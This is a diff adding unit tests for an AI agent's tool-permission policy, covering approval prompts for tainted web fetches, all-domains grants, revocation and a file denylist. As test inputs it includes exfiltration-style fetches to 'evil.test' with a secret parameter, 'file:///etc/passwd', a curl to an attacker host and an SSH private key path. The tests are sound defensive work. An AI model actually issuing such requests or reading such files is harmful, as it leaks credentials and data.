@@ -156,6 +156,69 @@ describe("tool policy (§5.5, §5.6)", () => {
     expect(decide({ ...t, egress: { mode: "open" } }, "WebFetch", { url: "https://evil.test/x" })).toMatchObject({ policy: "allowed", taints: false });
   });
 
+  test("a tainted fetch offers both the domain and every domain; neither in a chat", () => {
+    const t = ctx({ tainted: true });
+    expect(decide(t, "WebFetch", { url: "https://evil.test/x?secret=1" }).approval).toEqual({
+      reason: "tainted_egress",
+      offerAlways: true,
+      url: "https://evil.test/x?secret=1",
+      suggestedGrant: { tool: "WebFetch", pattern: "evil.test", class: "network" },
+      suggestedGrantAll: { tool: "WebFetch", pattern: "*", class: "network" },
+    });
+    expect(decide({ ...t, grantsAllowed: false }, "WebFetch", { url: "https://evil.test/x" }).approval).toEqual({ reason: "tainted_egress", offerAlways: false, url: "https://evil.test/x" });
+    // Neither where the call isn't a fetch to a host name an all-domains grant would cover.
+    expect(decide(t, "WebFetch", { url: "file:///etc/passwd" }).approval).toEqual({ reason: "tainted_egress", offerAlways: false, url: "file:///etc/passwd" });
+    expect(decide(t, "WebFetch", { url: "http://[::1]/" }).approval).toMatchObject({ offerAlways: false });
+    expect(decide(t, "WebFetch", { url: "http://[::1]/" }).approval?.suggestedGrantAll).toBeUndefined();
+    const ip = decide(t, "WebFetch", { url: "http://203.0.113.7/x" }).approval;
+    expect(ip).toMatchObject({ offerAlways: true, suggestedGrant: { pattern: "203.0.113.7" } });
+    expect(ip?.suggestedGrantAll).toBeUndefined();
+    expect(decide(t, "WebFetch", { url: "http://localhost:8080/" }).approval?.suggestedGrantAll).toBeUndefined();
+    // WebSearch, Bash and MCP are unchanged.
+    for (const [tool, input] of [["WebSearch", { query: "x" }], ["Bash", { command: "curl https://evil.test" }], ["mcp__fixture__lookup", {}]] as const)
+      expect(decide(t, tool, input).approval?.suggestedGrantAll).toBeUndefined();
+  });
+
+  test("web_read_only offers neither choice (§9.9)", () => {
+    const w = ctx({ authority: "web_read_only", tainted: true });
+    expect(decide(w, "WebFetch", { url: "https://evil.test/x" })).toMatchObject({ policy: "needs_approval", approval: { reason: "web_read_only", offerAlways: false } });
+    expect(decide(w, "WebFetch", { url: "https://evil.test/x" }).approval).toEqual({ reason: "web_read_only", offerAlways: false, url: "https://evil.test/x" });
+  });
+
+  test("an all-domains grant covers a fetch to any host name, and only WebFetch", () => {
+    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
+    const t = ctx({ tainted: true, grants: [all] });
+    for (const url of ["https://evil.test/x?secret=1", "http://a.b.c.example.org/", "https://xn--bcher-kva.de/"])
+      expect(decide(t, "WebFetch", { url })).toMatchObject({ policy: "granted", allow: true, grantId: all.grant_id, taints: true });
+    // Not what a wildcard would not cover either: non-http(s), IP literals, loopback names.
+    for (const url of ["file:///etc/passwd", "ftp://evil.test/", "http://127.0.0.1/", "http://[::1]/", "http://localhost/"])
+      expect(decide(t, "WebFetch", { url }).policy).toBe("needs_approval");
+    expect(decide(t, "WebSearch", { query: "x" }).policy).toBe("needs_approval");
+    expect(decide(t, "Bash", { command: "curl https://evil.test" }).policy).toBe("needs_approval");
+    expect(decide(t, "mcp__fixture__lookup", {}).policy).toBe("needs_approval");
+    // Untainted, a fetch is plainly allowed: the grant isn't needed.
+    expect(decide(ctx({ grants: [all] }), "WebFetch", { url: "https://evil.test/" }).policy).toBe("allowed");
+  });
+
+  test("an all-domains grant doesn't lift web_read_only or the denylist (§9.9, §13)", () => {
+    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
+    expect(decide(ctx({ tainted: true, grants: [all], authority: "web_read_only" }), "WebFetch", { url: "https://evil.test/" }).approval?.reason).toBe("web_read_only");
+    const t = ctx({ tainted: true, grants: [all] });
+    const key = join(dir, "home", ".ssh", "id_ed25519");
+    expect(decide(t, "Read", { file_path: key })).toMatchObject({ policy: "denied", allow: false });
+    expect(decide(t, "WebFetch", { url: `file://${key}` })).toMatchObject({ policy: "needs_approval", approval: { offerAlways: false } });
+  });
+
+  test("revoking the all-domains grant brings the prompt back", () => {
+    const all = grant({ tool: "WebFetch", pattern: "*", class: "network" });
+    expect(decide(ctx({ tainted: true, grants: [all] }), "WebFetch", { url: "https://evil.test/" }).policy).toBe("granted");
+    const revoked = { ...all, revoked_at: 2 };
+    expect(decide(ctx({ tainted: true, grants: [revoked] }), "WebFetch", { url: "https://evil.test/" })).toMatchObject({
+      policy: "needs_approval",
+      approval: { reason: "tainted_egress", suggestedGrantAll: { tool: "WebFetch", pattern: "*", class: "network" } },
+    });
+  });
+
   test("web_read_only (§9.9): only read-class calls run; grants do not lift it", () => {
     const w = ctx({ authority: "web_read_only" });
     expect(decide(w, "Read", { file_path: join(root, "a") }).policy).toBe("allowed");
